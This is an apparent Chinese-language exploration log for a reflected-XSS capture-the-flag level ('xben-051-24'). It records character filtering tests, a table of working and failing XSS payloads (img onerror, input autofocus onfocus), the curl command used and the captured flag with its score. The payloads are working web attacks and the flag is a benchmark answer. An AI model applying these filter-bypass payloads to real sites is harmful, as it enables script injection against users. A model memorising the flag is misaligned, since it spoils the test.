# xben-051-24 · 探索记录

对应题解：[`xben-051-24.md`](./xben-051-24.md)

## 目标与起点

`Werkzeug/1.0.1 Python/2.7.18`，`GET /page?name=…`，样式 `xss12.css`。
反射在文本节点：

```html
<input type=text name=name placeholder="Enter your name..." > abc>
```

## 第一阶段：逐字符探测

94 个字符中只有两个导致输入消失：

| 字符 | 反射 |
| --- | --- |
| `'` | `>`（输入被删，只剩模板自带字符） |
| `/` | `>`（同上） |
| 其余 92 个 | 原样保留（含 `"` `<` `>` `=` 空格） |

## 第二阶段：payload 枚举

| payload | 结果 |
| --- | --- |
| `<img src=x onerror=alert("XSS")>` | **Congratulations** |
| `<input autofocus onfocus=alert("XSS")>` | **Congratulations** |
| `<svg onload=alert("XSS")>` | 失败 |
| `<body onload=alert("XSS")>` | 失败 |

## 第三阶段：拿 flag

```bash
curl --get --data-urlencode 'name=<img src=x onerror=alert("XSS")>' http://$T/page
```

```text
flag{431d867b-e6a8-40de-b2b2-e51c55f24f2f}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 单引号参数 `alert('XSS')` | 输入被删 | `'` 属过滤字符 |
| 自闭合 `<svg/onload=…>` | `/` 被删，标签坏掉 | `/` 属过滤字符 |
| `svg onload` / `body onload` | 未触发 | 本关判定集合不含它们 |

## 这次真正的收获

1. **`/` 被删不影响 `img`+`onerror`**：这个组合不需要闭合、不需要自闭合斜杠，
   所以过滤形同虚设。
2. **`'` 被删时用双引号**：输入在文本节点，双引号不会破坏结构。
   （如果在属性里就要用实体编码，比如 049。）
3. **本关与 046 正好互补**：046 接受 `svg/body onload`、拒绝 `img/input`；
   051 反之。说明评测端的「有效触发集合」是每关单独配置的。
4. **逐字符探测 → payload 枚举，两步走最省。** 先定字符集，再在少量组合里挑，
   避免盲目试几十个 payload。
